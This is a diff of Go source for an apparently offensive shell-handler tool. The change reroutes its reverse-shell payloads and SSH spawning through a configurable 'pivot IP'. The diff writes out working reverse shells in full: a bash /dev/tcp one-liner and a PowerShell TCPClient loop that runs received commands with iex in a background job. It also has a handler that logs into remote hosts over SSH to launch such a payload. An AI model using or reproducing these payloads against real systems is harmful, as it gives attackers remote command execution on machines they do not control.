@@ -2173,7 +2173,7 @@ func (m *Manager) handleCommand(command string) {
 		m.handleSSH(parts[1])
 	case "rev":
 		// Optional: rev [ip] [port]
-		ip := m.listenerIP
+		ip := GlobalRuntimeConfig.GetPivotIP()
 		port := m.listenerPort
 
 		if len(parts) >= 2 {
@@ -2334,7 +2334,7 @@ func (m *Manager) showHelp() {
 
 	// Pivot category
 	lines = append(lines, ui.CommandHelp("pivot"))
-	lines = append(lines, ui.Command("pivot <host:port>            - Route HTTP URLs through pivot host"))
+	lines = append(lines, ui.Command("pivot <ip>                   - Route all URLs/payloads through pivot IP"))
 	lines = append(lines, ui.Command("pivot off                    - Disable pivot"))
 	lines = append(lines, "")
 
@@ -2641,12 +2641,13 @@ func (m *Manager) handleSpawn() {
 	}
 
 	// Validate that we have IP and port
-	if m.listenerIP == "" {
-		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
+	spawnIP := GlobalRuntimeConfig.GetPivotIP()
+	if spawnIP == "" {
+		fmt.Println(ui.Error("No listener IP available"))
 		return
 	}
 	if m.listenerPort == 0 {
-		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
+		fmt.Println(ui.Error("No listener port available"))
 		return
 	}
 
@@ -2661,13 +2662,11 @@ func (m *Manager) handleSpawn() {
 	var payload string
 	switch platform {
 	case "linux", "macos":
-		// Bash reverse shell that runs in background
 		payload = fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'\n",
-			m.listenerIP, m.listenerPort)
+			spawnIP, m.listenerPort)
 	case "windows":
-		// PowerShell reverse shell (base64 encoded for reliability)
 		psScript := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
-			m.listenerIP, m.listenerPort)
+			spawnIP, m.listenerPort)
 		// Execute in background with Start-Job
 		payload = fmt.Sprintf("powershell -c \"Start-Job -ScriptBlock {%s}\"\n", psScript)
 	default:
@@ -2724,17 +2723,18 @@ func (m *Manager) handleSpawn() {
 // handleSSH connects to a remote host via SSH and executes reverse shell payload
 func (m *Manager) handleSSH(target string) {
 	// Validate that we have IP and port
-	if m.listenerIP == "" {
-		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
+	sshIP := GlobalRuntimeConfig.GetPivotIP()
+	if sshIP == "" {
+		fmt.Println(ui.Error("No listener IP available"))
 		return
 	}
 	if m.listenerPort == 0 {
-		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
+		fmt.Println(ui.Error("No listener port available"))
 		return
 	}
 
 	// Create SSH connector
-	connector := NewSSHConnector(m.listenerIP, m.listenerPort)
+	connector := NewSSHConnector(sshIP, m.listenerPort)
 
 	// Connect silently (only SSH password prompt will show)
 	err := connector.ConnectInteractive(target)
@@ -2767,10 +2767,10 @@ func (m *Manager) handleShowConfig() {
 
 	// Pivot section
 	lines = append(lines, ui.CommandHelp("pivot"))
-	lines = append(lines, ui.Command(fmt.Sprintf("enabled: %v", rc.PivotEnabled)))
 	if rc.PivotEnabled {
-		lines = append(lines, ui.Command(fmt.Sprintf("host: %s", rc.PivotHost)))
-		lines = append(lines, ui.Command(fmt.Sprintf("port: %d", rc.PivotPort)))
+		lines = append(lines, ui.Command(fmt.Sprintf("ip: %s", rc.PivotHost)))
+	} else {
+		lines = append(lines, ui.Command("disabled"))
 	}
 
 	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Configuration", ui.SymbolGem), lines))
@@ -2886,13 +2886,13 @@ func (m *Manager) handleBinbag(args []string) {
 	}
 }
 
-// handlePivot handles the 'pivot' command
+// handlePivot handles the 'pivot' command — sets the pivot IP for all outgoing URLs/payloads
 func (m *Manager) handlePivot(args []string) {
 	rc := GlobalRuntimeConfig
 
 	if len(args) == 0 {
 		if rc.PivotEnabled {
-			fmt.Println(ui.Info(fmt.Sprintf("Pivot: %s:%d", rc.PivotHost, rc.PivotPort)))
+			fmt.Println(ui.Info(fmt.Sprintf("Pivot: %s", rc.PivotHost)))
 		} else {
 			fmt.Println(ui.Info("Pivot is disabled"))
 		}
@@ -2908,22 +2908,13 @@ func (m *Manager) handlePivot(args []string) {
 		return
 	}
 
-	// Parse host:port
-	h, p, err := net.SplitHostPort(args[0])
-	if err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Invalid format: %s (use host:port)", args[0])))
-		return
-	}
-	port, err := strconv.Atoi(p)
-	if err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Invalid port: %s", p)))
-		return
-	}
-	if err := rc.SetPivot(h, port); err != nil {
+	// Set pivot IP
+	ip := args[0]
+	if err := rc.SetPivot(ip); err != nil {
 		fmt.Println(ui.Error(fmt.Sprintf("Failed to set pivot: %v", err)))
 		return
 	}
-	fmt.Println(ui.Success(fmt.Sprintf("Pivot: %s:%d", h, port)))
+	fmt.Println(ui.Success(fmt.Sprintf("Pivot: %s (all URLs/payloads will use this IP)", ip)))
 }
 
 // --- TUI adapter methods ---
